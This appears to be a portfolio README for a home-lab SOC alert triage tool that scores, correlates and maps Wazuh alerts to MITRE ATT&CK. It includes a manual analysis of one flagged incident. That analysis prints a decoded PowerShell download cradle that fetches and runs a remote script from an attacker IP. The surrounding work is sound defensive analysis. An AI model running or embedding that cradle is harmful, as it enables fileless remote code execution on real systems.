# SOC Alert Triage Tool

**A Python tool that turns raw Wazuh/Security Onion alert exports into analyst-ready triage reports, with a full manual investigation walkthrough.**

## Summary

Built as part of an ongoing home SOC lab (pfSense, Windows AD, Ubuntu, Wazuh/Security Onion, Kali, isolated network), this tool takes the kind of raw alert noise a SOC analyst deals with daily and turns it into something usable: alerts scored by severity, correlated into incidents by time and source, mapped to MITRE ATT&CK tactics and techniques, and paired with a recommended next action for each. On top of the automated layer, I added a manual investigation write-up decoding an obfuscated PowerShell payload from one of the flagged alerts, showing the analyst reasoning that automated tooling alone can't provide.

## What it does

- Parses Wazuh-style JSON alert exports.
- Scores alerts by severity band (LOW / MEDIUM / HIGH / CRITICAL) using Wazuh rule levels.
- Correlates alerts by source IP within a configurable time window, so a 6-alert brute-force burst reads as one incident instead of six disconnected lines.
- Extracts MITRE ATT&CK tactics and techniques from each alert.
- Applies rule-based recommendations (isolate host, escalate to Tier 2, monitor, log only) based on severity and detected technique.
- Outputs a clean Markdown triage report.

## The investigation, not just the tool

Automated correlation flagged Incident 4 (source `185.220.101.34`) as CRITICAL: an SSH brute-force that succeeded, immediately followed by a suspicious base64-encoded PowerShell command. The script's output stops at "suspicious process detected," which isn't enough to justify an escalation on its own.

So I took it further manually: decoded the payload in [CyberChef](https://gchq.github.io/CyberChef/) (`From Base64` → `Decode text`, UTF-16LE, since PowerShell's `-EncodedCommand` flag encodes scripts as UTF-16LE before base64). The decoded command was a PowerShell download cradle:

```
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.34:8080/update.ps1')
```

This executes a remote script entirely in memory, no file touches disk, which is a technique specifically used to evade traditional file-scanning antivirus. Cross-referencing the destination IP against the incident timeline showed it was the same IP that had just brute-forced its way in minutes earlier, supporting a read of this as a real intrusion (initial access via brute force, followed by fileless payload staging) rather than a false positive. Full write-up with decode steps and reasoning is in `analyst_notes.md`.

## Skills demonstrated

Python scripting and data parsing (JSON ingestion, time-window correlation logic), SOC/blue-team fundamentals (severity triage, incident correlation, escalation criteria), MITRE ATT&CK framework application, manual malware/payload analysis (base64/UTF-16LE decoding, PowerShell download-cradle identification), and technical documentation written for a real audience (a Tier 2 analyst picking up the case).

## Known limitation

Correlation is currently source-IP-only, so an attack chain where the compromised host starts talking back out (a different source IP) gets split across two incidents in the report. Documented in the README as a deliberate scoping choice and a clear next iteration, along with the reasoning for why source-IP-only was the right place to start.

## Repo

   [github.com/CyberSamliya/soc-alert-triage](https://github.com/CyberSamliya/soc-alert-triage)
Update repo link
